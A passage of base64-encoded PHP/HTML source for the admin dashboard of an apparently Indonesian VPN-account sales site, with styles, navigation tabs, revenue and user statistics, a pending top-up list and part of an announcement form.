246IGZhZGVJbiAuMjVzIGVhc2U7IH0KICAgICAgICBAa2V5ZnJhbWVzIGZhZGVJbiB7IGZyb217b3BhY2l0eTowO3RyYW5zZm9ybTp0cmFuc2xhdGVZKDRweCl9IHRve29wYWNpdHk6MTt0cmFuc2Zvcm06dHJhbnNsYXRlWSgwKX0gfQogICAgICAgIC5jYXJkIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogdmFyKC0tY2FyZCk7CiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHZhcigtLWJvcmRlcik7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IHZhcigtLXJhZGl1cyk7CiAgICAgICAgICAgIGJveC1zaGFkb3c6IHZhcigtLXNoYWRvdyk7CiAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDI0cHg7CiAgICAgICAgfQogICAgICAgIC5jYXJkLWhlYWRlciB7CiAgICAgICAgICAgIGRpc3BsYXk6ZmxleDsgYWxpZ24taXRlbXM6Y2VudGVyOyBqdXN0aWZ5LWNvbnRlbnQ6c3BhY2UtYmV0d2VlbjsKICAgICAgICAgICAgcGFkZGluZzogMTZweCAyMHB4OwogICAgICAgICAgICBib3JkZXItYm90dG9tOiAxcHggc29saWQgdmFyKC0tYm9yZGVyLWxpZ2h0KTsKICAgICAgICAgICAgZ2FwOiAxMnB4OwogICAgICAgIH0KICAgICAgICAuY2FyZC10aXRsZSB7IGZvbnQtc2l6ZTogLjk1ZW07IGZvbnQtd2VpZ2h0OiA2MDA7IGNvbG9yOiB2YXIoLS10ZXh0KTsgbGV0dGVyLXNwYWNpbmc6IC0uMXB4OyB9CiAgICAgICAgLmNhcmQtYm9keSB7IHBhZGRpbmc6IDIwcHg7IH0KICAgICAgICAuc3RhdHMgeyBkaXNwbGF5OmdyaWQ7IGdyaWQtdGVtcGxhdGUtY29sdW1uczogcmVwZWF0KGF1dG8tZml0LCBtaW5tYXgoMjIwcHgsMWZyKSk7IGdhcDogMTZweDsgbWFyZ2luLWJvdHRvbTogMjRweDsgfQogICAgICAgIC5zdGF0LWNhcmQgewogICAgICAgICAgICBiYWNrZ3JvdW5kOiB2YXIoLS1jYXJkKTsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgdmFyKC0tYm9yZGVyKTsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogdmFyKC0tcmFkaXVzKTsKICAgICAgICAgICAgcGFkZGluZzogMjBweDsKICAgICAgICAgICAgZGlzcGxheTpmbGV4OyBhbGlnbi1pdGVtczpjZW50ZXI7IGdhcDogMTZweDsKICAgICAgICAgICAgYm94LXNoYWRvdzogdmFyKC0tc2hhZG93KTsKICAgICAgICAgICAgdHJhbnNpdGlvbjogdmFyKC0tdHJhbnNpdGlvbik7CiAgICAgICAgfQogICAgICAgIC5zdGF0LWNhcmQ6aG92ZXIgeyBib3JkZXItY29sb3I6IHZhcigtLWJvcmRlci1saWdodCk7IGJveC1zaGFkb3c6IHZhcigtLXNoYWRvdy1sZyk7IH0KICAgICAgICAuc3RhdC1pY29uIHsgd2lkdGg6NDRweDsgaGVpZ2h0OjQ0cHg7IGJvcmRlci1yYWRpdXM6IHZhcigtLXJhZGl1cy1zbSk7IGRpc3BsYXk6ZmxleDsgYWxpZ24taXRlbXM6Y2VudGVyOyBqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyOyBmb250LXdlaWdodDo3MDA7IGZvbnQtc2l6ZTouOWVtOyBmbGV4LXNocmluazowOyB9CiAgICAgICAgLnNpLXVzZXJzIHsgYmFja2dyb3VuZDogcmdiYSg5OSwxMDIsMjQxLC4xNSk7IGNvbG9yOiB2YXIoLS1wcmltYXJ5KTsgfQogICAgICAgIC5zaS12cG4geyBiYWNrZ3JvdW5kOiByZ2JhKDE2LDE4NSwxMjksLjEyKTsgY29sb3I6IHZhcigtLXN1Y2Nlc3MpOyB9CiAgICAgICAgLnNpLW9yZGVycyB7IGJhY2tncm91bmQ6IHJnYmEoMjQ1LDE1OCwxMSwuMTIpOyBjb2xvcjogdmFyKC0td2FybmluZyk7IH0KICAgICAgICAuc2ktcmV2ZW51ZSB7IGJhY2tncm91bmQ6IHJnYmEoMTM5LDkyLDI0NiwuMTIpOyBjb2xvcjogIzhiNWNmNjsgfQogICAgICAgIC5zdGF0LXZhbCB7IGZvbnQtc2l6ZToxLjVlbTsgZm9udC13ZWlnaHQ6NzAwOyBsaW5lLWhlaWdodDoxLjI7IGxldHRlci1zcGFjaW5nOi0uNXB4OyB9CiAgICAgICAgLnN0YXQtbGFiZWwgeyBmb250LXNpemU6Ljc4ZW07IGNvbG9yOiB2YXIoLS1tdXRlZCk7IGZvbnQtd2VpZ2h0OjUwMDsgbWFyZ2luLXRvcDoycHg7IH0KICAgICAgICAudGFibGUtd3JhcCB7IG92ZXJmbG93LXg6YXV0bzsgfQogICAgICAgIHRhYmxlIHsgd2lkdGg6MTAwJTsgYm9yZGVyLWNvbGxhcHNlOmNvbGxhcHNlOyBmb250LXNpemU6Ljg4ZW07IH0KICAgICAgICB0aCB7CiAgICAgICAgICAgIHRleHQtYWxpZ246bGVmdDsgcGFkZGluZzogMTJweCAxNnB4OwogICAgICAgICAgICBmb250LXNpemU6LjcyZW07IGZvbnQtd2VpZ2h0OjYwMDsgdGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlOwogICAgICAgICAgICBsZXR0ZXItc3BhY2luZzouNnB4OyBjb2xvcjogdmFyKC0tbXV0ZWQpOwogICAgICAgICAgICBib3JkZXItYm90dG9tOiAycHggc29saWQgdmFyKC0tYm9yZGVyKTsKICAgICAgICAgICAgd2hpdGUtc3BhY2U6bm93cmFwOwogICAgICAgIH0KICAgICAgICB0ZCB7IHBhZGRpbmc6IDEycHggMTZweDsgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkIHZhcigtLWJvcmRlcik7IGNvbG9yOiB2YXIoLS10ZXh0LWRpbSk7IH0KICAgICAgICB0cjpob3ZlciB0ZCB7IGJhY2tncm91bmQ6IHJnYmEoOTksMTAyLDI0MSwuMDMpOyB9CiAgICAgICAgLnRleHQtbW9ubyB7IGZvbnQtZmFtaWx5OiAnU0YgTW9ubycsJ0ZpcmEgQ29kZScsJ0NvbnNvbGFzJyxtb25vc3BhY2U7IGZvbnQtc2l6ZTouODJlbTsgfQogICAgICAgIC5iYWRnZSB7CiAgICAgICAgICAgIGRpc3BsYXk6aW5saW5lLWJsb2NrOyBwYWRkaW5nOiAzcHggMTBweDsgYm9yZGVyLXJhZGl1czogMjBweDsKICAgICAgICAgICAgZm9udC1zaXplOi43MmVtOyBmb250LXdlaWdodDo2MDA7IGxldHRlci1zcGFjaW5nOi40cHg7CiAgICAgICAgICAgIHRleHQtdHJhbnNmb3JtOiB1cHBlcmNhc2U7IHdoaXRlLXNwYWNlOm5vd3JhcDsKICAgICAgICB9CiAgICAgICAgLmItcGVuZGluZyB7IGJhY2tncm91bmQ6IHJnYmEoMjQ1LDE1OCwxMSwuMTIpOyBjb2xvcjogdmFyKC0td2FybmluZyk7IH0KICAgICAgICAuYi1hcHByb3ZlZCwgLmItYWN0aXZlLCAuYi1zdWNjZXNzIHsgYmFja2dyb3VuZDogcmdiYSgxNiwxODUsMTI5LC4xMik7IGNvbG9yOiB2YXIoLS1zdWNjZXNzKTsgfQogICAgICAgIC5iLXJlamVjdGVkLCAuYi1kYW5nZXIgeyBiYWNrZ3JvdW5kOiByZ2JhKDIzOSw2OCw2OCwuMSk7IGNvbG9yOiB2YXIoLS1kYW5nZXIpOyB9CiAgICAgICAgLmItcmVhZHkgeyBiYWNrZ3JvdW5kOiByZ2JhKDU5LDEzMCwyNDYsLjEyKTsgY29sb3I6IHZhcigtLWluZm8pOyB9CiAgICAgICAgLmItb2ZmbGluZSB7IGJhY2tncm91bmQ6IHJnYmEoMTAwLDExNiwxMzksLjEpOyBjb2xvcjogdmFyKC0tbXV0ZWQpOyB9CiAgICAgICAgLmItbWFpbnRlbmFuY2UgeyBiYWNrZ3JvdW5kOiByZ2JhKDI0NSwxNTgsMTEsLjEpOyBjb2xvcjogdmFyKC0td2FybmluZyk7IH0KICAgICAgICAuYnRuIHsKICAgICAgICAgICAgZGlzcGxheTppbmxpbmUtZmxleDsgYWxpZ24taXRlbXM6Y2VudGVyOyBqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyOyBnYXA6NnB4OwogICAgICAgICAgICBwYWRkaW5nOiA5cHggMThweDsgYm9yZGVyLXJhZGl1czogdmFyKC0tcmFkaXVzLXNtKTsKICAgICAgICAgICAgZm9udC1zaXplOi44NGVtOyBmb250LXdlaWdodDo2MDA7IGxldHRlci1zcGFjaW5nOi4ycHg7CiAgICAgICAgICAgIGJvcmRlcjogbm9uZTsgY3Vyc29yOiBwb2ludGVyOwogICAgICAgICAgICB0cmFuc2l0aW9uOiB2YXIoLS10cmFuc2l0aW9uKTsKICAgICAgICAgICAgd2hpdGUtc3BhY2U6bm93cmFwOwogICAgICAgIH0KICAgICAgICAuYnRuLXByaW1hcnkgeyBiYWNrZ3JvdW5kOiB2YXIoLS1wcmltYXJ5KTsgY29sb3I6ICNmZmY7IH0KICAgICAgICAuYnRuLXByaW1hcnk6aG92ZXIgeyBiYWNrZ3JvdW5kOiB2YXIoLS1wcmltYXJ5LWRpbSk7IGJveC1zaGFkb3c6IDAgNHB4IDEycHggcmdiYSg5OSwxMDIsMjQxLC4zKTsgfQogICAgICAgIC5idG4tZ3JlZW4geyBiYWNrZ3JvdW5kOiByZ2JhKDE2LDE4NSwxMjksLjE1KTsgY29sb3I6IHZhcigtLXN1Y2Nlc3MpOyBib3JkZXI6IDFweCBzb2xpZCByZ2JhKDE2LDE4NSwxMjksLjI1KTsgfQogICAgICAgIC5idG4tZ3JlZW46aG92ZXIgeyBiYWNrZ3JvdW5kOiByZ2JhKDE2LDE4NSwxMjksLjI1KTsgfQogICAgICAgIC5idG4tcmVkIHsgYmFja2dyb3VuZDogcmdiYSgyMzksNjgsNjgsLjEpOyBjb2xvcjogdmFyKC0tZGFuZ2VyKTsgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyMzksNjgsNjgsLjIpOyB9CiAgICAgICAgLmJ0bi1yZWQ6aG92ZXIgeyBiYWNrZ3JvdW5kOiByZ2JhKDIzOSw2OCw2OCwuMik7IH0KICAgICAgICAuYnRuLW91dGxpbmUgeyBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsgY29sb3I6IHZhcigtLXRleHQtZGltKTsgYm9yZGVyOiAxcHggc29saWQgdmFyKC0tYm9yZGVyKTsgfQogICAgICAgIC5idG4tb3V0bGluZTpob3ZlciB7IGJvcmRlci1jb2xvcjogdmFyKC0tcHJpbWFyeSk7IGNvbG9yOiB2YXIoLS1wcmltYXJ5KTsgfQogICAgICAgIC5idG4teWVsbG93IHsgYmFja2dyb3VuZDogcmdiYSgyNDUsMTU4LDExLC4xNSk7IGNvbG9yOiB2YXIoLS13YXJuaW5nKTsgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNDUsMTU4LDExLC4yNSk7IH0KICAgICAgICAuYnRuLXllbGxvdzpob3ZlciB7IGJhY2tncm91bmQ6IHJnYmEoMjQ1LDE1OCwxMSwuMjUpOyB9CiAgICAgICAgLmJ0bi1zbSB7IHBhZGRpbmc6IDVweCAxMnB4OyBmb250LXNpemU6Ljc4ZW07IH0KICAgICAgICAuYnRuLXhzIHsgcGFkZGluZzogM3B4IDhweDsgZm9udC1zaXplOi43ZW07IGJvcmRlci1yYWRpdXM6IDZweDsgfQogICAgICAgIGxhYmVsIHsKICAgICAgICAgICAgZGlzcGxheTpibG9jazsgbWFyZ2luLWJvdHRvbTo2cHg7CiAgICAgICAgICAgIGZvbnQtc2l6ZTouNzhlbTsgZm9udC13ZWlnaHQ6NjAwOyB0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2U7CiAgICAgICAgICAgIGxldHRlci1zcGFjaW5nOi41cHg7IGNvbG9yOiB2YXIoLS1tdXRlZCk7CiAgICAgICAgfQogICAgICAgIGlucHV0LCBzZWxlY3QsIHRleHRhcmVhIHsKICAgICAgICAgICAgd2lkdGg6MTAwJTsgcGFkZGluZzogMTBweCAxNHB4OwogICAgICAgICAgICBiYWNrZ3JvdW5kOiB2YXIoLS1iZyk7CiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHZhcigtLWJvcmRlcik7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IHZhcigtLXJhZGl1cy1zbSk7CiAgICAgICAgICAgIGNvbG9yOiB2YXIoLS10ZXh0KTsKICAgICAgICAgICAgZm9udC1zaXplOi45ZW07IGZvbnQtZmFtaWx5OiBpbmhlcml0OwogICAgICAgICAgICB0cmFuc2l0aW9uOiB2YXIoLS10cmFuc2l0aW9uKTsKICAgICAgICAgICAgb3V0bGluZTogbm9uZTsKICAgICAgICB9CiAgICAgICAgaW5wdXQ6Zm9jdXMsIHNlbGVjdDpmb2N1cywgdGV4dGFyZWE6Zm9jdXMgeyBib3JkZXItY29sb3I6IHZhcigtLXByaW1hcnkpOyBib3gtc2hhZG93OiAwIDAgMCAzcHggcmdiYSg5OSwxMDIsMjQxLC4xMik7IH0KICAgICAgICBzZWxlY3QgeyBjdXJzb3I6cG9pbnRlcjsgfQogICAgICAgIHRleHRhcmVhIHsgcmVzaXplOnZlcnRpY2FsOyBtaW4taGVpZ2h0OjgwcHg7IH0KICAgICAgICAuZm9ybS1ncm91cCB7IG1hcmdpbi1ib3R0b206IDE2cHg7IH0KICAgICAgICAuZm9ybS1yb3cgeyBkaXNwbGF5OmZsZXg7IGdhcDogMTJweDsgfQogICAgICAgIC5mb3JtLXJvdyA+IC5mb3JtLWdyb3VwIHsgZmxleDoxOyB9CiAgICAgICAgLnNlY3Rpb24tdGl0bGUgeyBmb250LXNpemU6LjgyZW07IGZvbnQtd2VpZ2h0OjcwMDsgY29sb3I6IHZhcigtLXByaW1hcnkpOyB0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2U7IGxldHRlci1zcGFjaW5nOi44cHg7IG1hcmdpbjogMjBweCAwIDEycHg7IHBhZGRpbmctYm90dG9tOjhweDsgYm9yZGVyLWJvdHRvbToxcHggc29saWQgdmFyKC0tYm9yZGVyKTsgfQogICAgICAgIC5hbGVydCB7IHBhZGRpbmc6IDEycHggMTZweDsgYm9yZGVyLXJhZGl1czogdmFyKC0tcmFkaXVzLXNtKTsgZm9udC1zaXplOi44NWVtOyBmb250LXdlaWdodDo1MDA7IG1hcmdpbi1ib3R0b206MTZweDsgfQogICAgICAgIC5hbGVydC1zdWNjZXNzIHsgYmFja2dyb3VuZDogcmdiYSgxNiwxODUsMTI5LC4xKTsgY29sb3I6IHZhcigtLXN1Y2Nlc3MpOyBib3JkZXI6IDFweCBzb2xpZCByZ2JhKDE2LDE4NSwxMjksLjIpOyB9CiAgICAgICAgLmFsZXJ0LWVycm9yIHsgYmFja2dyb3VuZDogcmdiYSgyMzksNjgsNjgsLjA4KTsgY29sb3I6IHZhcigtLWRhbmdlcik7IGJvcmRlcjogMXB4IHNvbGlkIHJnYmEoMjM5LDY4LDY4LC4xNSk7IH0KICAgICAgICAubW9kYWwtb3ZlcmxheSB7IGRpc3BsYXk6bm9uZTsgcG9zaXRpb246Zml4ZWQ7IGluc2V0OjA7IGJhY2tncm91bmQ6cmdiYSgwLDAsMCwuNik7IGJhY2tkcm9wLWZpbHRlcjpibHVyKDRweCk7IHotaW5kZXg6MjAwOyBhbGlnbi1pdGVtczpjZW50ZXI7IGp1c3RpZnktY29udGVudDpjZW50ZXI7IH0KICAgICAgICAubW9kYWwtb3ZlcmxheS5zaG93IHsgZGlzcGxheTpmbGV4OyB9CiAgICAgICAgLm1vZGFsIHsgYmFja2dyb3VuZDp2YXIoLS1jYXJkKTsgYm9yZGVyOjFweCBzb2xpZCB2YXIoLS1ib3JkZXIpOyBib3JkZXItcmFkaXVzOnZhcigtLXJhZGl1cyk7IHBhZGRpbmc6MjRweDsgd2lkdGg6OTAlOyBtYXgtd2lkdGg6NTAwcHg7IGJveC1zaGFkb3c6dmFyKC0tc2hhZG93LWxnKTsgfQogICAgICAgIAogICAgICAgIC5ncmlkMiB7IGRpc3BsYXk6Z3JpZDsgZ3JpZC10ZW1wbGF0ZS1jb2x1bW5zOiAxZnIgMWZyOyBnYXA6IDE2cHg7IH0KICAgICAgICAuZ3JpZDMgeyBkaXNwbGF5OmdyaWQ7IGdyaWQtdGVtcGxhdGUtY29sdW1uczogMWZyIDFmciAxZnI7IGdhcDogMTZweDsgfQogICAgICAgIEBtZWRpYShtYXgtd2lkdGg6NzY4cHgpIHsgLmdyaWQyLCAuZ3JpZDMgeyBncmlkLXRlbXBsYXRlLWNvbHVtbnM6IDFmcjsgfSB9CiAgICAgICAgQG1lZGlhKG1heC13aWR0aDo3NjhweCkgewogICAgICAgICAgICAubGF5b3V0IHsgZmxleC1kaXJlY3Rpb246Y29sdW1uOyB9CiAgICAgICAgICAgIC5zaWRlYmFyIHsgd2lkdGg6MTAwJTsgbWluLXdpZHRoOjEwMCU7IGJvcmRlci1yaWdodDpub25lOyBib3JkZXItYm90dG9tOjFweCBzb2xpZCB2YXIoLS1ib3JkZXIpOyBtYXgtaGVpZ2h0OjUwdmg7IH0KICAgICAgICAgICAgLm1haW4geyBwYWRkaW5nOiAyMHB4IDE2cHg7IH0KICAgICAgICAgICAgLnN0YXRzIHsgZ3JpZC10ZW1wbGF0ZS1jb2x1bW5zOiAxZnIgMWZyOyB9CiAgICAgICAgICAgIC5mb3JtLXJvdyB7IGZsZXgtZGlyZWN0aW9uOmNvbHVtbjsgfQogICAgICAgICAgICAudG9wYmFyIHsgcGFkZGluZzogMCAxNnB4OyB9CiAgICAgICAgfQogICAgICAgIEBtZWRpYShtYXgtd2lkdGg6NDgwcHgpIHsKICAgICAgICAgICAgLnN0YXRzIHsgZ3JpZC10ZW1wbGF0ZS1jb2x1bW5zOiAxZnI7IH0KICAgICAgICB9Cjwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+CjxkaXYgY2xhc3M9InRvcGJhciI+CiAgPGRpdiBjbGFzcz0idG9wYmFyLWJyYW5kIj4KICAgIDxzcGFuPjw/PWdldFNldHRpbmcoJ2FwcF9sb2dvJywnT1ZQTicpPz48L3NwYW4+CiAgICA8Pz0kYXBwTmFtZT8+IDxzcGFuIGNsYXNzPSJhZG1pbi1iYWRnZSI+QWRtaW48L3NwYW4+CiAgPC9kaXY+CiAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2dhcDouNXJlbTthbGlnbi1pdGVtczpjZW50ZXIiPgogICAgPGRpdiBjbGFzcz0ic2lkZWJhci1saW5rcyI+CiAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iL29yZGVydnBuL2Rhc2hib2FyZC5waHAiIGNsYXNzPSJzaWRlYmFyLWxpbmsiPlVzZXIgUGFuZWw8L2E+CiAgICA8YSBocmVmPSIvb3JkZXJ2cG4vYXBpL2xvZ291dC5waHAiIGNsYXNzPSJzaWRlYmFyLWxpbmsgZGFuZ2VyIj5Mb2dvdXQ8L2E+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICA8L2Rpdj4KPC9kaXY+Cgo8ZGl2IGNsYXNzPSJ0YWJzIj4KICA8YnV0dG9uIGNsYXNzPSJ0YWItYnRuIGFjdGl2ZSIgb25jbGljaz0ic2hvd1RhYignZGFzaGJvYXJkJykiPkRhc2hib2FyZDwvYnV0dG9uPgogIDxidXR0b24gY2xhc3M9InRhYi1idG4iIG9uY2xpY2s9InNob3dUYWIoJ3RvcHVwJykiPlRvcHVwIDw/cGhwIGlmKCRzdGF0c1sndG9wdXBfcCddPjApOj8+PHNwYW4gc3R5bGU9ImJhY2tncm91bmQ6dmFyKC0tcmVkKTtjb2xvcjojZmZmO2ZvbnQtc2l6ZTouNjVyZW07cGFkZGluZzouMXJlbSAuNHJlbTtib3JkZXItcmFkaXVzOjk5cHg7bWFyZ2luLWxlZnQ6LjNyZW0iPjw/PSRzdGF0c1sndG9wdXBfcCddPz48L3NwYW4+PD9waHAgZW5kaWY7Pz48L2J1dHRvbj4KICA8YnV0dG9uIGNsYXNzPSJ0YWItYnRuIiBvbmNsaWNrPSJzaG93VGFiKCdzZXJ2ZXJzJykiPlNlcnZlcjwvYnV0dG9uPgogIDxidXR0b24gY2xhc3M9InRhYi1idG4iIG9uY2xpY2s9InNob3dUYWIoJ3VzZXJzJykiPlVzZXJzPC9idXR0b24+CiAgPGJ1dHRvbiBjbGFzcz0idGFiLWJ0biIgb25jbGljaz0ic2hvd1RhYignb3JkZXJzJykiPk9yZGVyczwvYnV0dG9uPgogIDxidXR0b24gY2xhc3M9InRhYi1idG4iIG9uY2xpY2s9InNob3dUYWIoJ2FrdW5zJykiPlZQTiBBY2NvdW50czwvYnV0dG9uPgogIDxidXR0b24gY2xhc3M9InRhYi1idG4iIG9uY2xpY2s9InNob3dUYWIoJ3NldHRpbmdzJykiPlNldHRpbmdzPC9idXR0b24+CiAgICA8YSBocmVmPSIuLi9jaGFuZ2VfcGFzc3dvcmQucGhwIiBjbGFzcz0ic2lkZWJhci1saW5rIiBzdHlsZT0iY29sb3I6I2Y1OWUwYiI+UGFzc3dvcmQ8L2E+CjwvZGl2PgoKPGRpdiBjbGFzcz0iY29udGVudCI+CiAgPD9waHAgaWYoJHNhdmVkKTo/PjxkaXYgY2xhc3M9ImFsZXJ0IGFsZXJ0LXN1Y2Nlc3MiPlNldHRpbmdzIHNhdmVkIHN1Y2Nlc3NmdWxseS48L2Rpdj48P3BocCBlbmRpZjs/PgoKICA8IS0tIERBU0hCT0FSRCAtLT4KICA8ZGl2IGNsYXNzPSJwYWdlIGFjdGl2ZSIgaWQ9InRhYi1kYXNoYm9hcmQiPgogICAgPGRpdiBjbGFzcz0ic3RhdHMiPgogICAgICA8ZGl2IGNsYXNzPSJzdGF0LWNhcmQiPjxkaXYgY2xhc3M9InN0YXQtaWNvbiBzdGF0LWljb24tdXNlcnMiPjwvZGl2PjxkaXYgY2xhc3M9InN0YXQtdmFsIj48Pz0kc3RhdHNbJ3VzZXJzJ10/PjwvZGl2PjxkaXYgY2xhc3M9InN0YXQtbGFiZWwiPlRvdGFsIFVzZXJzPC9kaXY+PC9kaXY+CiAgICAgIDxkaXYgY2xhc3M9InN0YXQtY2FyZCI+PGRpdiBjbGFzcz0ic3RhdC1pY29uIHNpLXZwbiI+VjwvZGl2PjxkaXYgY2xhc3M9InN0YXQtdmFsIj48Pz0kc3RhdHNbJ2FrdW4nXT8+PC9kaXY+PGRpdiBjbGFzcz0ic3RhdC1sYWJlbCI+QWt1biBBa3RpZjwvZGl2PjwvZGl2PgogICAgICA8ZGl2IGNsYXNzPSJzdGF0LWNhcmQiPjxkaXYgY2xhc3M9InN0YXQtaWNvbiBzdGF0LWljb24tdXNlcnMiPjwvZGl2PjxkaXYgY2xhc3M9InN0YXQtdmFsIj48Pz0kc3RhdHNbJ29yZGVycyddPz48L2Rpdj48ZGl2IGNsYXNzPSJzdGF0LWxhYmVsIj5Ub3RhbCBPcmRlcjwvZGl2PjwvZGl2PgogICAgICA8ZGl2IGNsYXNzPSJzdGF0LWNhcmQiPjxkaXYgY2xhc3M9InN0YXQtaWNvbiBzdGF0LWljb24tdXNlcnMiPjwvZGl2PjxkaXYgY2xhc3M9InN0YXQtdmFsIj48Pz1mb3JtYXRSdXBpYWgoJHN0YXRzWydyZXZlbnVlJ10pPz48L2Rpdj48ZGl2IGNsYXNzPSJzdGF0LWxhYmVsIj5Ub3RhbCBSZXZlbnVlPC9kaXY+PC9kaXY+CiAgICAgIDxkaXYgY2xhc3M9InN0YXQtY2FyZCI+PGRpdiBjbGFzcz0ic3RhdC1pY29uIj48L2Rpdj48ZGl2IGNsYXNzPSJzdGF0LXZhbCIgc3R5bGU9ImNvbG9yOnZhcigtLXllbGxvdykiPjw/PSRzdGF0c1sndG9wdXBfcCddPz48L2Rpdj48ZGl2IGNsYXNzPSJzdGF0LWxhYmVsIj5Ub3B1cCBQZW5kaW5nPC9kaXY+PC9kaXY+CiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+PGRpdiBjbGFzcz0iY2FyZC10aXRsZSI+UGVuZGluZyBUb3B1cCBQZW5kaW5nPC9kaXY+PC9kaXY+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgPD9waHAgaWYoZW1wdHkoJHBlbmRpbmdUb3B1cHMpKTo/PjxwIHN0eWxlPSJjb2xvcjp2YXIoLS1tdXRlZCk7Zm9udC1zaXplOi44NzVyZW0iPlRpZGFrIGFkYSB0b3B1cCBwZW5kaW5nLjwvcD4KICAgICAgICA8P3BocCBlbHNlOiBmb3JlYWNoKCRwZW5kaW5nVG9wdXBzIGFzICR0KTo/PgogICAgICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW47cGFkZGluZzouNzVyZW07YmFja2dyb3VuZDp2YXIoLS1jYXJkMik7Ym9yZGVyLXJhZGl1czoxMHB4O21hcmdpbi1ib3R0b206LjVyZW07Ym9yZGVyOjFweCBzb2xpZCAjOTI0MDBlNDQ7Z2FwOjFyZW07ZmxleC13cmFwOndyYXAiPgogICAgICAgICAgPGRpdj4KICAgICAgICAgICAgPGRpdiBzdHlsZT0iZm9udC13ZWlnaHQ6NjAwO2ZvbnQtc2l6ZTouODc1cmVtIj48Pz1odG1sc3BlY2lhbGNoYXJzKCR0Wyd1c2VybmFtZSddKT8+PC9kaXY+CiAgICAgICAgICAgIDxkaXYgc3R5bGU9ImZvbnQtc2l6ZTouNzVyZW07Y29sb3I6dmFyKC0tbXV0ZWQpIj48Pz1odG1sc3BlY2lhbGNoYXJzKCR0WydwYXltZW50X21ldGhvZCddKT8+IMK3IDw/PWRhdGUoJ2QgTSBZIEg6aScsc3RydG90aW1lKCR0WydjcmVhdGVkX2F0J10pKT8+PC9kaXY+CiAgICAgICAgICAgIDw/cGhwIGlmKCR0WydidWt0aV90cmFuc2ZlciddKTo/PjxhIGhyZWY9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoJHRbJ2J1a3RpX3RyYW5zZmVyJ10pPz4iIHRhcmdldD0iX2JsYW5rIiBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lIiBzdHlsZT0ibWFyZ2luLXRvcDouMzVyZW07Zm9udC1zaXplOi43cmVtIj5WaWV3IEJ1a3RpPC9hPjw/cGhwIGVuZGlmOz8+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxkaXYgc3R5bGU9ImZvbnQtc2l6ZToxcmVtO2ZvbnQtd2VpZ2h0OjgwMDtjb2xvcjp2YXIoLS15ZWxsb3cpIj48Pz1mb3JtYXRSdXBpYWgoJHRbJ2Ftb3VudCddKT8+PC9kaXY+CiAgICAgICAgICAgICAgPGhyIHN0eWxlPSJib3JkZXItY29sb3I6IzFlM2E1ZjttYXJnaW46MS41cmVtIDAgMXJlbSI+CiAgICAgICAgICAgICAgPGgzIHN0eWxlPSJmb250LXNpemU6MXJlbTtmb250LXdlaWdodDo3MDA7Y29sb3I6I2YxZjVmOTttYXJnaW4tYm90dG9tOjFyZW07Ij5bIFBlbmd1bXVtYW4gLyBQcm9tbyBkaSBIYWxhbWFuIExvZ2luIF08L2gzPgogICAgICAgICAgICAgIDxwIHN0eWxlPSJmb250LXNpemU6Ljc4cmVtO2NvbG9yOiM2NDc0OGI7bWFyZ2luLWJvdHRvbToxcmVtOyI+CiAgICAgICAgICAgICAgICBGb3JtYXQ6IDxjb2RlIHN0eWxlPSJiYWNrZ3JvdW5kOiMwYTE2Mjg7cGFkZGluZzoycHggNnB4O2JvcmRlci1yYWRpdXM6NHB4OyI+QkFER0V8VEVLUzwvY29kZT4g4oCUIEJBREdFOiBCQVJVLCBQUk9NTywgYXRhdSBJTkZPLiBLb3NvbmdrYW4gdW50dWsgbWVueWVtYnVueWlrYW4uCiAgICAgICAgICAgICAgPC9wPgoKICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0ibGJsIj5QZW5ndW11bWFuIDE8L2xhYmVsPgogICAgICAgICAgICAgICAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2dhcDouNXJlbTsiPgogICAgICAgICAgICAgICAgICA8c2VsZWN0IG5hbWU9ImFubm91bmNlXzFfYmFkZ2UiIHN0eWxlPSJ3aWR0aDoxMDBweDtwYWRkaW5nOi43cmVtIC42cmVtO2JhY2tncm91bmQ6IzBhMTYyODtib3JkZXI6MXB4IHNvbGlkICMxZTNhNWY7Ym9yZGVyLXJhZGl1czo4cHg7Y29sb3I6I2YxZjVmOTtmb250LXNpemU6Ljg1cmVtO2ZvbnQtZmFtaWx5OmluaGVyaXQ7Ij4KICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJCQVJVIj5CQVJVPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iUFJPTU8iPlBST01PPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iSU5GTyI+SU5GTzwvb3B0aW9uPgogICAgICAgICAgICAgICAgICA8L3NlbGVjdD4KICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hb